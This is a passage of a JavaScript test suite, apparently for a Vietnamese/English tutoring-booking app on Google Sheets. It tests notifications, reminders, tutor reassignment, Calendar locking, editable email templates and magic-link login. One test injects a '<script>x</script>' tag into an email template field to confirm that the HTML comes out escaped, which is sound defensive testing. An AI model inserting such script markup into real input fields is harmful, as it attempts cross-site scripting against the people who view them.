  assert.strictEqual(c.row('USERS', u.userId).phone, '+66812345678');
  assert.strictEqual(c.row('USERS', u.userId).contact_link, '', 'số nước ngoài không có link Zalo');
});

// ═══ Chunk 5B ═══

function stuToken(c, uid) {
  const url = c.api.withLock_(() => c.api.createLoginLinkInLock_(c.api.userById_(uid)));
  return c.api.apiExchangeToken(url.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
}

t('I28', 'Thông báo theo mức: huỷ thì email ngay kèm link đúng dòng; Completed vào tổng hợp; admin đổi luật trong NOTIFY_RULES là có hiệu lực', () => {
  const c = mk(), { api, env } = c;
  const [a, b] = c.book('S003', [[K(14, 10), '19:00'], [K(15, 10), '19:00']]);
  const tok = stuToken(c, 'S003');
  const n0 = c.mailsTo(EMAIL.ADMIN).length;
  assert.ok(api.apiStudentCancel(tok, a.bookingId).ok);
  const nc = c.rows('NOTIFICATIONS').find(n => n.event === 'STUDENT_CANCELLED');
  assert.strictEqual(nc.level, 'WARNING');
  assert.ok(nc.emailed_at, 'đã email');
  const em = c.mailsTo(EMAIL.ADMIN).slice(n0).find(m => m.subject.indexOf('[Cần xử lý]') === 0);
  assert.ok(em && /#gid=BOOKINGS&amp;range=A\d+|#gid=BOOKINGS&range=A\d+/.test(em.htmlBody), 'email có link mở đúng dòng BOOKINGS');
  // Completed: chỉ ghi, chờ tổng hợp
  c.at('2026-10-15 19:40');
  const turl = api.withLock_(() => api.createLoginLinkInLock_(api.userById_(c.row('BOOKINGS', b.bookingId).tutor_id)));
  const ttok = api.apiExchangeToken(turl.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
  const n1 = c.mailsTo(EMAIL.ADMIN).length;
  assert.ok(api.apiTutorSubmitResult(ttok, b.bookingId, 'COMPLETED').ok);
  const ncp = c.rows('NOTIFICATIONS').find(n => n.event === 'RESULT_COMPLETED');
  assert.ok(ncp && ncp.channel === 'DIGEST' && !ncp.emailed_at);
  assert.strictEqual(c.mailsTo(EMAIL.ADMIN).length, n1, 'Completed không email ngay');
  // Admin đổi luật: huỷ chỉ ghi lại, không email
  api.withLock_(() => api.table_('NOTIFY_RULES').insert({ event: 'STUDENT_CANCELLED', level: 'INFO', channel: 'LOG', note: '' }));
  api.clearConfigCache_();
  const [d] = c.book('S005', [[K(17, 10), '19:00']]);
  c.at('2026-10-15 19:45');
  const n2 = c.mailsTo(EMAIL.ADMIN).length;
  assert.ok(api.apiStudentCancel(stuToken(c, 'S005'), d.bookingId).ok);
  assert.strictEqual(c.mailsTo(EMAIL.ADMIN).length, n2, 'luật LOG: không email');
  assert.strictEqual(c.rows('NOTIFICATIONS').filter(n => n.event === 'STUDENT_CANCELLED').pop().channel, 'LOG');
  // Tổng hợp 21:00: gửi 1 lần, đánh dấu từng dòng; hôm sau không có gì mới thì không gửi lại
  const isDigest = m => m.subject.indexOf('[Tổng hợp') === 0;
  c.at('2026-10-15 21:05'); api.hourlyJob();
  assert.strictEqual(c.mailsTo(EMAIL.ADMIN).filter(isDigest).length, 1);
  assert.ok(c.rows('NOTIFICATIONS').filter(n => n.channel === 'DIGEST').every(n => n.digest_at), 'dòng đã tổng hợp được đánh dấu');
  c.at('2026-10-16 21:05'); api.hourlyJob();
  assert.strictEqual(c.mailsTo(EMAIL.ADMIN).filter(isDigest).length, 1, 'không gửi lại tin cũ');
});

t('I29', 'Nhắc buổi sáng (mặc định tắt, bật bằng CONFIG): mỗi học viên, mỗi tutor 1 email liệt kê buổi hôm nay; chạy lại không gửi trùng; buổi đã bắt đầu bỏ qua', () => {
  const c = mk(), { api, env } = c;
  c.onlyOpen(K(14, 10), '08:00', ['T001']); c.onlyOpen(K(14, 10), '19:00', ['T001']); c.onlyOpen(K(14, 10), '20:00', ['T001']);
  c.book('S003', [[K(14, 10), '08:00']]);
  c.book('S005', [[K(14, 10), '19:00']]);
  c.book('S007', [[K(14, 10), '20:00']]);
  // Mặc định từ 15/10: tắt (MORNING_REMINDER_HOUR = -1)
  c.at('2026-10-14 08:20'); api.hourlyJob();
  assert.strictEqual(env.state.mails.filter(m => /^Hôm nay|^Today:/.test(m.subject)).length, 0, 'mặc định tắt nhắc 8:00');
  api.withLock_(() => api.table_('CONFIG').insert({ key: 'MORNING_REMINDER_HOUR', value: '8' })); api.clearConfigCache_();
  c.at('2026-10-14 07:30'); api.hourlyJob();
  assert.strictEqual(env.state.mails.filter(m => /^Hôm nay|^Today:/.test(m.subject)).length, 0, 'chưa tới giờ');
  c.at('2026-10-14 08:20'); api.hourlyJob();
  assert.ok(c.mailsTo(EMAIL.S005).some(m => m.subject.indexOf('Hôm nay bạn có 1 buổi học') === 0));
  assert.ok(!c.mailsTo(EMAIL.S003).some(m => m.subject.indexOf('Hôm nay') === 0), 'buổi 08:00 đã bắt đầu');
  const tm = c.mailsTo(EMAIL.T001).filter(m => m.subject.indexOf('Today:') === 0);
  assert.strictEqual(tm.length, 1); assert.ok(tm[0].subject.indexOf('Today: 2 lessons') === 0, tm[0].subject);
  c.at('2026-10-14 09:20'); api.hourlyJob();
  assert.strictEqual(c.mailsTo(EMAIL.T001).filter(m => m.subject.indexOf('Today:') === 0).length, 1, 'không gửi trùng');
});

t('I30', '5J: sau hạn mở lịch (mặc định 22:00 thứ Bảy) admin nhận 1 thông báo liệt kê tutor chưa mở lịch tuần sau; tutor đã mở không bị nêu tên; lỡ lượt thì làm bù', () => {
  const c = mk('2026-10-17 21:30'), { api } = c;
  api.setAvailabilityFor_('T002', [{ date: K(20, 10), slot: '19:00', open: true }], EMAIL.T002);
  api.hourlyJob();
  assert.ok(!c.rows('NOTIFICATIONS').some(n => n.event === 'TUTOR_NO_AVAILABILITY'), 'chưa tới hạn');
  c.at('2026-10-18 09:10'); api.hourlyJob();   // lượt 22:00 đến 08:00 bị lỡ: làm bù
  const n = c.rows('NOTIFICATIONS').filter(x => x.event === 'TUTOR_NO_AVAILABILITY');
  assert.strictEqual(n.length, 1);
  assert.ok(/T001/.test(n[0].entity_id) && !/T002/.test(n[0].entity_id), n[0].entity_id);
  assert.ok(/22:00 Thứ 7 17\/10/.test(n[0].message) && !/Chủ nhật/.test(n[0].message), n[0].message);
  assert.ok(c.mailsTo(EMAIL.ADMIN).some(m => /chưa mở lịch/.test(m.subject)));
  c.at('2026-10-18 16:10'); api.hourlyJob();
  assert.strictEqual(c.rows('NOTIFICATIONS').filter(x => x.event === 'TUTOR_NO_AVAILABILITY').length, 1, 'không lặp');
});

t('I31', 'Tutor xin huỷ: chỉ định tutor thay theo admin_note; tutor chỉ định bận thì giữ chờ duyệt và ghi lý do; huỷ buổi thì không trừ buổi học viên', () => {
  const c = mk('2026-10-12 10:00'), { api } = c;
  const prep = (sid, dk) => { c.onlyOpen(dk, '20:00', ['T001']); const id = c.book(sid, [[dk, '20:00']])[0].bookingId; api.setAvailabilityFor_('T001', [{ date: dk, slot: '20:00', open: false }], EMAIL.T001); return { id, av: c.rows('AVAILABILITY').find(a => a.tutor_id === 'T001' && c.keyOf(a.date) === dk && a.slot === '20:00') }; };
  const setNote = (av, note) => api.withLock_(() => api.table_('AVAILABILITY').update(api.table_('AVAILABILITY').byId(av.avail_id), { admin_note: note }));
  // Chỉ định T003 (đang mở)
  const x = prep('S003', K(14, 10)); c.setSlot('T003', K(14, 10), '20:00', 'OPEN'); setNote(x.av, 'nhờ t003 dạy');
  assert.strictEqual(api.decideTutorCancel_(x.av.avail_id, 'Duyệt, chỉ định tutor thay', 'admin').outcome, 'REASSIGNED');
  assert.strictEqual(c.row('BOOKINGS', x.id).tutor_id, 'T003');
  assert.ok(/Đã đổi sang T003/.test(c.row('AVAILABILITY', x.av.avail_id).outcome));
  assert.strictEqual(c.row('AVAILABILITY', x.av.avail_id).status, 'BLOCKED');
  // Chỉ định T004 (không mở): giữ chờ duyệt
  const y = prep('S005', K(15, 10)); setNote(y.av, 'T004');
  assert.strictEqual(api.decideTutorCancel_(y.av.avail_id, 'Duyệt, chỉ định tutor thay', 'admin').ok, false);
  const ya = c.row('AVAILABILITY', y.av.avail_id);
  assert.strictEqual(ya.status + '|' + ya.admin_decision, 'CANCEL_PENDING|Chờ duyệt');
  assert.ok(/Không chỉ định được T004/.test(ya.outcome));
  assert.strictEqual(c.row('BOOKINGS', y.id).status + '|' + c.row('BOOKINGS', y.id).tutor_id, 'CONFIRMED|T001');
  // Huỷ buổi
  assert.strictEqual(api.decideTutorCancel_(y.av.avail_id, 'Duyệt, huỷ buổi', 'admin').outcome, 'CANCELLED_TUTOR');
  assert.strictEqual(c.row('BOOKINGS', y.id).status, 'CANCELLED_TUTOR');
  assert.strictEqual(c.row('AVAILABILITY', y.av.avail_id).status, 'BLOCKED');
  assert.ok(c.mailsTo(EMAIL.S005).some(m => m.subject.indexOf('Huỷ buổi') === 0));
});

t('I32', 'Chịu tải: Calendar gọi khi KHÔNG giữ khoá; buổi bị huỷ trong lúc tạo sự kiện thì sự kiện được gỡ', () => {
  const c = mk(), { api, env } = c;
  const real = env.globals.Calendar.Events.insert, held = [];
  let cancelOnce = true;
  env.globals.Calendar.Events.insert = (res, cal, opt) => {
    held.push(!!env.state.lockHeld);
    const ev = real(res, cal, opt);
    if (cancelOnce) { // giả lập học viên huỷ đúng lúc đang tạo sự kiện đầu tiên (một lần chạy khác)
      cancelOnce = false;
      const sh = env.state.spreadsheets.DB_STAGING_TEST.sheets.BOOKINGS, col = api.SCHEMA.BOOKINGS.cols.indexOf('status');
      sh.values[1][col] = 'CANCELLED_STUDENT';
    }
    return ev;
  };
  const res = c.book('S003', [[K(14, 10), '19:00'], [K(15, 10), '19:00'], [K(16, 10), '19:00']]);
  env.globals.Calendar.Events.insert = real;
  assert.deepStrictEqual(held, [false, false, false], 'không gọi Calendar khi đang giữ khoá');
  assert.ok(res.every(r => r.ok));
  const first = c.row('BOOKINGS', res[0].bookingId);
  assert.strictEqual(first.event_id, '', 'buổi đã huỷ không được gắn sự kiện');
  assert.strictEqual(c.calls('remove').length, 1, 'sự kiện thừa được gỡ');
  assert.ok(c.row('BOOKINGS', res[1].bookingId).event_id && c.row('BOOKINGS', res[1].bookingId).meet_link);
});

t('I33', 'Admin vào được mọi phòng Meet: thêm ADMIN_EMAIL làm khách không gửi thư; tắt ADMIN_JOIN_MEET thì không thêm', () => {
  const c = mk(), { api } = c;
  const [r] = c.book('S003', [[K(14, 10), '19:00']]);
  const ev = c.row('BOOKINGS', r.bookingId).event_id;
  const p = c.calls('patch').find(x => x.id === ev);
  assert.ok(p && p.sendUpdates === 'none' && p.attendees.indexOf(EMAIL.ADMIN) !== -1, JSON.stringify(p));
  api.withLock_(() => api.table_('CONFIG').insert({ key: 'ADMIN_JOIN_MEET', value: 'FALSE' }));
  api.clearConfigCache_();
  const [r2] = c.book('S005', [[K(15, 10), '19:00']]);
  const ev2 = c.row('BOOKINGS', r2.bookingId).event_id;
  assert.ok(!c.calls('patch').some(x => x.id === ev2));
});

t('I34', 'Cài đặt tạo NOTIFY_RULES, tô màu 4 tab, ô tick read; link mở đúng dòng', () => {
  const { api, env } = freshEnv();
  api.setupFirstRun();
  api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.table_('NOTIFY_RULES').all().length, Object.keys(api.DEFAULT_NOTIFY_RULES_).length);
  const sh = env.state.spreadsheets.NEW_DB.sheets;
  assert.ok(sh.NOTIFICATIONS.cfRules.length === 3 && sh.REGISTRATIONS.cfRules.length === 1 && sh.AVAILABILITY.cfRules.length === 2 && sh.BOOKINGS.cfRules.length === 3);
  assert.ok(/^=AND\(\$C2="CRITICAL",\$P2<>TRUE\)$/.test(sh.NOTIFICATIONS.cfRules[1].formula), sh.NOTIFICATIONS.cfRules[1].formula);
  assert.ok(/#gid=REGISTRATIONS&range=A5$/.test(api.rowLink_('REGISTRATIONS', 5)));
  // Chạy lại không thêm trùng luật
  api.setupFirstRun(); api.clearDbCache_();
  assert.strictEqual(api.table_('NOTIFY_RULES').all().length, Object.keys(api.DEFAULT_NOTIFY_RULES_).length);
});


// ── 5C: nội dung web và email chỉnh trên Sheets ──
const fs = require('fs'), path = require('path');
function setContent(c, key, value, lang) {
  const { api } = c, col = lang === 'en' ? 'en' : 'vi';
  api.withLock_(() => { const t = api.table_('CONTENT'), r = t.byId(key); if (r) t.update(r, { [col]: value }); else t.insert({ key, [col]: value, note: '' }); });
}
function setTpl(c, key, patch) {
  const { api } = c;
  api.withLock_(() => { const t = api.table_('EMAIL_TEMPLATES'), r = t.byId(key); if (r) t.update(r, patch); else t.insert(Object.assign({ key, active: true }, patch)); });
}

t('I35', 'Mọi chữ T.t trên web có trong DEFAULT_CONTENT_; mọi mẫu email đủ 2 thứ tiếng; không còn {{ }} sót khi gửi thử', () => {
  const { api, env } = mk();
  const used = new Set();
  fs.readdirSync(path.join(__dirname, '..', 'src', 'ui')).forEach(f => {
    const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'ui', f), 'utf8');
    (src.match(/T\.t\('([a-z]\.[a-z0-9_]+)'/g) || []).forEach(m => { if (!/_'$/.test(m)) used.add(m.slice(5, -1)); });
    (src.match(/'([a-z]\.[a-z0-9_]+)'\s*[:)]/g) || []).forEach(m => { const k = m.match(/'([^']+)'/)[1]; if (/^[ahlst]\./.test(k) && !/_$/.test(k)) used.add(k); });
  });
  ['active', 'inactive', 'queued', 'expired'].forEach(x => used.add('s.pill_' + x));
  const missing = [...used].filter(k => !api.DEFAULT_CONTENT_[k]);
  assert.deepStrictEqual(missing, [], 'key thiếu: ' + missing.join(', '));
  assert.ok(used.size > 120, 'web dùng ' + used.size + ' key');
  Object.keys(api.DEFAULT_EMAIL_TEMPLATES_).forEach(k => {
    const d = api.DEFAULT_EMAIL_TEMPLATES_[k];
    assert.ok(d[1] && d[3] && d[4] && d[6], k + ' thiếu tiếng Việt hoặc tiếng Anh');
    const before = env.state.mails.length, r = api.previewEmail_(k, 'qa@test.vn');
    assert.ok(r.ok, k + ': ' + r.error);
    const m = env.state.mails[before];
    assert.ok(m && m.to === 'qa@test.vn', k);
    assert.ok(!/\{\{|\}\}/.test(m.subject + m.htmlBody), k + ' còn biến chưa thay: ' + m.subject);
    assert.ok(/English|Tiếng Việt/.test(m.htmlBody), k + ' thiếu nửa thứ hai');
    assert.ok(/ \| /.test(m.subject), k + ' tiêu đề chưa song ngữ: ' + m.subject);
  });
});

t('I36', 'Admin sửa mẫu email trong Sheets: email gửi ra đổi theo, biến được thay, chữ nhập không chèn được HTML', () => {
  const c = mk(), { api } = c;
  setTpl(c, 'BOOKING_CONFIRM', { subject_vi: 'Lịch học mới của {{name}} <b>', body_vi: 'Xin chào **{{name}}**, đây là chữ admin vừa sửa <script>x</script>\n\n{{lessons_html}}', subject_en: '-' });
  const w = api.refreshContent_().warnings;
  assert.ok(w.length === 1 && /BOOKING_CONFIRM \(body_vi\).*portal_url/.test(w[0]), 'chỉ cảnh báo mất nút Xem lịch: ' + w.join(' | '));
  const [r] = c.book('S003', [[K(14, 10), '19:00']]);
  assert.ok(r.ok);
  const m = c.mailsTo(EMAIL.S003).filter(x => /^Lịch học mới/.test(x.subject))[0];
  assert.ok(m, 'không thấy email theo tiêu đề mới');
  assert.ok(/^Lịch học mới của .+ <b>$/.test(m.subject), 'ô subject_en ghi dấu - thì bỏ tiêu đề tiếng Anh: ' + m.subject);
  assert.ok(m.htmlBody.indexOf('<b>' + api.esc_(api.userById_('S003').display_name || '')) !== -1 || /Xin chào <b>/.test(m.htmlBody), 'chữ đậm');
  assert.ok(m.htmlBody.indexOf('&lt;script&gt;') !== -1 && m.htmlBody.indexOf('<script>') === -1, 'HTML trong ô bị thoát');
  assert.ok(/19:00/.test(m.htmlBody), 'danh sách buổi vẫn có');
  assert.ok(/Hi /.test(m.htmlBody), 'ô body_en không sửa thì giữ mẫu gốc');
  // Xoá chữ trong ô: quay về mẫu gốc
  setTpl(c, 'BOOKING_CONFIRM', { subject_vi: '', body_vi: '', subject_en: '' }); api.refreshContent_();
  c.book('S003', [[K(15, 10), '19:00']]);
  assert.ok(c.mailsTo(EMAIL.S003).some(x => /^Xác nhận 1 buổi học \| 1 lesson/.test(x.subject)), c.mailsTo(EMAIL.S003).map(x => x.subject).join(' / '));
});

t('I37', 'Mẫu tắt (active FALSE) thì không gửi và ghi nhật ký; tutor nhận email tiếng Anh ở trên', () => {
  const c = mk(), { api } = c;
  setTpl(c, 'BOOKING_CONFIRM', { active: false }); api.refreshContent_();
  const before = c.mailsTo(EMAIL.S003).length;
  const [r] = c.book('S003', [[K(14, 10), '19:00']]);
  assert.ok(r.ok, 'đặt lịch vẫn thành công');
  assert.strictEqual(c.mailsTo(EMAIL.S003).length, before, 'không gửi email xác nhận');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'MAIL_TEMPLATE_OFF' && l.entity_id === 'BOOKING_CONFIRM'));
  const tm = c.mailsTo(api.userById_(c.row('BOOKINGS', r.bookingId).tutor_id).email).slice(-1)[0];
  assert.ok(/^New lesson|^\S.*\| /.test(tm.subject) && tm.htmlBody.indexOf('Tiếng Việt') !== -1, tm.subject);
  assert.ok(tm.htmlBody.indexOf('Hi ') < tm.htmlBody.indexOf('Tiếng Việt'), 'tiếng Anh ở trên');
});

t('I38', 'Nút kiểm tra: báo biến không có trong danh sách, key CONTENT lạ; gửi thử mẫu tắt hoặc không có thì báo lỗi rõ', () => {
  const c = mk(), { api } = c;
  setTpl(c, 'WELCOME', { body_vi: 'Chào {{ten_sai}} {{button:link_sai|Bấm}}' });
  setContent(c, 'h.khong_ton_tai', 'abc');
  const w = api.refreshContent_().warnings.join('\n');
  assert.ok(/WELCOME \(body_vi\): biến \{\{ten_sai\}\}/.test(w) && /link_sai/.test(w), w);
  assert.ok(/h\.khong_ton_tai/.test(w), w);
  assert.ok(/WELCOME \(body_vi\): mẫu gốc có nút \{\{button:login_url/.test(w), 'mất nút đăng nhập phải được cảnh báo: ' + w);
  assert.ok(/không có mẫu/.test(api.previewEmail_('XYZ', 'qa@test.vn').error));
  setTpl(c, 'WELCOME', { active: false });
  assert.ok(/đang tắt/.test(api.previewEmail_('WELCOME', 'qa@test.vn').error));
  // Mẫu mới cho marketing: thêm dòng là gửi thử được ngay
  setTpl(c, 'PROMO_TET', { audience: 'MARKETING', subject_vi: 'Ưu đãi Tết cho {{name}}', body_vi: 'Chào {{name}}', subject_en: 'Tet offer', body_en: 'Hi {{name}}', variables: 'name' });
  const r = api.previewEmail_('PROMO_TET', 'qa@test.vn');
  assert.ok(r.ok, r.error);
  assert.ok(c.mailsTo('qa@test.vn').some(m => m.subject === 'Ưu đãi Tết cho Minh Anh | Tet offer'));
});

t('I39', 'Cài đặt tạo CONTENT và EMAIL_TEMPLATES; chạy lại không ghi đè chữ admin đã sửa, chỉ cập nhật cột default_value; web đọc chữ mới sau khi bấm cập nhật', () => {
  const { api } = freshEnv();
  api.setupFirstRun(); api.clearDbCache_();
  const nC = Object.keys(api.contentDefaults_()).length, nE = Object.keys(api.DEFAULT_EMAIL_TEMPLATES_).length;
  assert.strictEqual(api.table_('CONTENT').all().length, nC);
  assert.strictEqual(api.table_('EMAIL_TEMPLATES').all().length, nE);
  api.contentMap_(); // trang web đã mở một lần: chữ nằm trong bộ nhớ đệm
  api.withLock_(() => { const t = api.table_('CONTENT'), r = t.byId('h.hero_title'); t.update(r, { vi: 'Tiêu đề admin sửa', default_vi: 'cũ', page: 'sai', en: 'Admin title' }); });
  api.withLock_(() => { const t = api.table_('EMAIL_TEMPLATES'), r = t.byId('WELCOME'); t.update(r, { subject_vi: 'Chào bạn mới' }); });
  assert.notStrictEqual(api.contentMap_()['h.hero_title'][0], 'Tiêu đề admin sửa', 'trước khi bấm cập nhật: còn bản đệm');
  api.refreshContent_();
  assert.deepStrictEqual(api.contentMap_()['h.hero_title'], ['Tiêu đề admin sửa', 'Admin title']);
  api.setupFirstRun(); api.clearDbCache_();
  const r = api.table_('CONTENT').byId('h.hero_title');
  assert.strictEqual(r.vi, 'Tiêu đề admin sửa');
  assert.strictEqual(r.en, 'Admin title');
  assert.strictEqual(r.default_vi, api.DEFAULT_CONTENT_['h.hero_title'][0], 'cột chữ gốc do code ghi lại');
  assert.strictEqual(r.page, 'Trang chủ', 'cột page do code ghi lại');
  assert.ok(r.position && r.shown_when, 'có giải thích vị trí và lúc xuất hiện');
  assert.strictEqual(api.table_('EMAIL_TEMPLATES').byId('WELCOME').subject_vi, 'Chào bạn mới');
  assert.strictEqual(api.table_('CONTENT').all().length, nC);
  // Ô value để trống: dùng mặc định
  api.withLock_(() => { const t = api.table_('CONTENT'); t.update(t.byId('h.hero_title'), { vi: '', en: '-' }); });
  api.refreshContent_();
  assert.deepStrictEqual(api.contentMap_()['h.hero_title'], [api.DEFAULT_CONTENT_['h.hero_title'][0], ''], 'ô trống dùng chữ gốc, ô - là ẩn');
});

t('I41', 'Câu báo lỗi máy chủ chỉnh được: học viên tiếng Việt, tutor tiếng Anh, trang đăng nhập cả hai; sửa r.MÃ trong CONTENT là đổi', () => {
  const c = mk(), { api } = c;
  assert.ok(/^Phiên đăng nhập đã hết hạn/.test(api.apiStudentHome('sai').message));
  assert.ok(/^Your session has expired/.test(api.apiTutorHome('sai').message), api.apiTutorHome('sai').message);
  const ex = api.apiExchangeToken('a'.repeat(64)).message;
  assert.ok(/Link đăng nhập không hợp lệ.* \/ This login link is not valid/.test(ex), ex);
  setContent(c, 'r.ONE_PER_DAY', 'Ngày này bạn đã có buổi rồi nhé.');
  setContent(c, 'r.SESSION_INVALID', 'Please log in again (edited).', 'en');
  api.refreshContent_();
  c.onlyOpen(K(14, 10), '19:00', ['T001']); c.onlyOpen(K(14, 10), '20:00', ['T001']);
  const tok = stuToken(c, 'S003');
  api.apiStudentBook(tok, [{ date: K(14, 10), slot: '19:00' }]);
  const r = api.apiStudentBook(tok, [{ date: K(14, 10), slot: '20:00' }]);
  assert.strictEqual(r.data[0].message, 'Ngày này bạn đã có buổi rồi nhé.');
  assert.deepStrictEqual(r.data[0].msg, { vi: 'Ngày này bạn đã có buổi rồi nhé.', en: 'Only 1 lesson per day can be booked.' }, 'chunk 5H: câu báo lỗi cả hai thứ tiếng');
  assert.strictEqual(api.apiTutorHome('sai').message, 'Please log in again (edited).');
  // 5J: xin link lần 2 trong LOGIN_LINK_COOLDOWN_MINUTES (60): báo giờ đã gửi và giờ xin lại được, hai thứ tiếng
  c.at('2026-10-12 10:00'); api.apiRequestLogin(EMAIL.S005);
  c.at('2026-10-12 10:20'); const rl = api.apiRequestLogin(EMAIL.S005);
  assert.ok(rl.reason === 'LINK_COOLDOWN' && /lúc 10:00/.test(rl.msg.vi) && /sau 11:00/.test(rl.msg.vi) && /after 11:00/.test(rl.msg.en) && !('vars' in rl), JSON.stringify(rl));
  c.at('2026-10-12 11:01'); assert.ok(api.apiRequestLogin(EMAIL.S005).ok, 'qua 60 phút: xin lại được');
});

t('I40', 'MORNING_REMINDER_HOUR = -1 và DIGEST_HOUR = -1: tắt nhắc buổi sáng và email tổng hợp; nhắc trước 60 phút vẫn chạy', () => {
  const c = mk(), { api, env } = c;
  c.onlyOpen(K(14, 10), '19:00', ['T001']);
  c.book('S005', [[K(14, 10), '19:00']]);
  api.withLock_(() => { api.table_('CONFIG').insert({ key: 'MORNING_REMINDER_HOUR', value: '-1' }); api.table_('CONFIG').insert({ key: 'DIGEST_HOUR', value: '-1' }); });
  api.clearConfigCache_();
  api.notify_('RESULT_COMPLETED', { message: 'thử' });
  ['2026-10-14 00:20', '2026-10-14 08:20', '2026-10-14 21:05', '2026-10-14 23:05'].forEach(x => { c.at(x); api.hourlyJob(); });
  assert.strictEqual(env.state.mails.filter(m => /^Hôm nay|^Today:/.test(m.subject)).length, 0, 'không nhắc buổi sáng');
  assert.strictEqual(c.mailsTo(EMAIL.ADMIN).filter(m => /tổng hợp|Daily/i.test(m.subject)).length, 0, 'không gửi tổng hợp');
  c.at('2026-10-14 18:05'); api.reminderJob();
  assert.ok(c.mailsTo(EMAIL.S005).some(m => /19:00/.test(m.subject + m.htmlBody) && /nhắc|Nhắc|Reminder|sắp/i.test(m.subject)), c.mailsTo(EMAIL.S005).map(m => m.subject).join(' / '));
});


// ── 5D: đăng nhập chuyên nghiệp; 5E: giao diện admin, xoá dữ liệu test ──
const UA_WIN = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36';
const UA_IOS = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1';
function linkFor(c, uid) { return c.api.withLock_(() => c.api.createLoginLinkInLock_(c.api.userById_(uid))).match(/t=([a-f0-9]{64})/)[1]; }
function tokenFor(c, uid, ua) { const r = c.api.apiExchangeToken(linkFor(c, uid), ua || UA_WIN); if (!r.ok) throw new Error('đăng nhập ' + uid + ': ' + r.reason); return r.data.sessionToken; }
function cfgSet(c, key, value) { c.api.withLock_(() => { const t = c.api.table_('CONFIG'), r = t.byId(key); if (r) t.update(r, { value }); else t.insert({ key, value }); }); c.api.clearConfigCache_(); }
const crypto5 = require('crypto');
function gsig(secret, email, ts) { return crypto5.createHmac('sha256', secret).update(email.toLowerCase() + '|' + ts, 'utf8').digest('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }

t('I42', '5J: link theo vai trò: tutor bấm nhiều lần trong 15 phút, admin 24 giờ; phiên theo vai trò (tutor 30 ngày từ 16/10); email "Có đăng nhập mới" chỉ cho admin (16/10); học viên vẫn dùng link nhiều lần', () => {
  const c = mk(), { api } = c;
  const raw = linkFor(c, 'T001');
  const r1 = api.apiExchangeToken(raw, UA_IOS);
  assert.ok(r1.ok && r1.data.role === 'TUTOR');
  assert.ok(api.apiExchangeToken(raw, UA_WIN).ok, '5J: link tutor bấm lần 2 trong 15 phút vẫn vào (TUTOR_LINK_MAX_USES 0)');
  cfgSet(c, 'TUTOR_LINK_MAX_USES', '2');
  assert.strictEqual(api.apiExchangeToken(raw, UA_WIN).reason, 'LINK_USED', 'đặt giới hạn 2 thì lần 3 bị chặn');
  cfgSet(c, 'TUTOR_LINK_MAX_USES', '0');
  const sess = c.rows('AUTH').filter(a => a.kind === 'SESSION' && a.user_id === 'T001')[0];
  assert.strictEqual(sess.device, 'Safari · iOS');
  const days = Math.round((new Date(sess.expires_at) - new Date(sess.created_at)) / 86400000);
  assert.strictEqual(days, 30, 'phiên tutor 30 ngày (16/10)');
  assert.strictEqual(c.mailsTo(EMAIL.T001).filter(x => /^New sign in/.test(x.subject)).length, 0, '16/10: tutor không nhận email đăng nhập mới');
  // Link tutor hết hạn sau 15 phút
  const late = linkFor(c, 'T002');
  { const n = new Date(api.getNow_().getTime() + 16 * 60000), z = (x) => String(x).padStart(2, '0');
    c.at(n.getFullYear() + '-' + z(n.getMonth() + 1) + '-' + z(n.getDate()) + ' ' + z(n.getHours()) + ':' + z(n.getMinutes())); }
  assert.strictEqual(api.apiExchangeToken(late, UA_WIN).reason, 'LINK_EXPIRED', 'link quá 15 phút');
  // Bật lại cho tutor bằng CONFIG: email tiếng Anh trước, ghi đúng thiết bị, không còn chỉ tới nút Thoát mọi thiết bị
  cfgSet(c, 'NEW_LOGIN_EMAIL_ROLES', 'ADMIN,TUTOR');
  assert.ok(api.apiExchangeToken(linkFor(c, 'T003'), UA_IOS).ok);
  const m = c.mailsTo(EMAIL.T003).filter(x => /^New sign in/.test(x.subject));
  assert.strictEqual(m.length, 1, 'email đăng nhập mới, tiếng Anh trước');
  assert.ok(/Safari · iOS/.test(m[0].htmlBody) && m[0].htmlBody.indexOf('Log out of all devices') === -1 && /message admin on Zalo/.test(m[0].htmlBody));
  cfgSet(c, 'NEW_LOGIN_EMAIL_ROLES', 'ADMIN');
  // Học viên: không có email đăng nhập mới, link dùng nhiều lần
  const rs = linkFor(c, 'S003');
  assert.ok(api.apiExchangeToken(rs, UA_WIN).ok && api.apiExchangeToken(rs, UA_WIN).ok);
  assert.ok(!c.mailsTo(EMAIL.S003).some(x => /đăng nhập mới/i.test(x.subject)));
  // Admin xin link bằng email: được khi ADMIN_LINK_LOGIN TRUE, link 24 giờ bấm nhiều lần, vào cổng admin
  const n0 = c.mailsTo('admin.karn@gmail.com').length;
  api.apiRequestLogin('admin.karn@gmail.com');
  const lm = c.mailsTo('admin.karn@gmail.com').slice(n0).find(x => /đăng nhập/i.test(x.subject));
  assert.ok(lm && /hết hạn sau 24 giờ/.test(lm.htmlBody) && /expires in 24 hours/.test(lm.htmlBody), 'link admin ghi 24 giờ (không ghi 1440 phút)');
  const araw = lm.htmlBody.match(/[?&;]t=([a-f0-9]{64})/)[1];
  const ra = api.apiExchangeToken(araw, UA_WIN);
  assert.ok(ra.ok && ra.data.role === 'ADMIN');
  { const t0 = api.getNow_().getTime(), at = (ms) => { const n = new Date(t0 + ms), z = (x) => String(x).padStart(2, '0'); c.at(n.getFullYear() + '-' + z(n.getMonth() + 1) + '-' + z(n.getDate()) + ' ' + z(n.getHours()) + ':' + z(n.getMinutes())); };
    at(23 * 3600000 + 58 * 60000); assert.ok(api.apiExchangeToken(araw, UA_WIN).ok, 'link admin còn dùng ở giờ thứ 23');
    at(24 * 3600000 + 2 * 60000); assert.strictEqual(api.apiExchangeToken(araw, UA_WIN).reason, 'LINK_EXPIRED', 'link admin hết hạn sau 24 giờ'); }
  cfgSet(c, 'ADMIN_LINK_LOGIN', 'FALSE');
  const n1 = c.mailsTo('admin.karn@gmail.com').length;
  assert.ok(api.apiRequestLogin('admin.karn@gmail.com').ok, 'vẫn trả cùng một câu (không lộ email có hay không)');
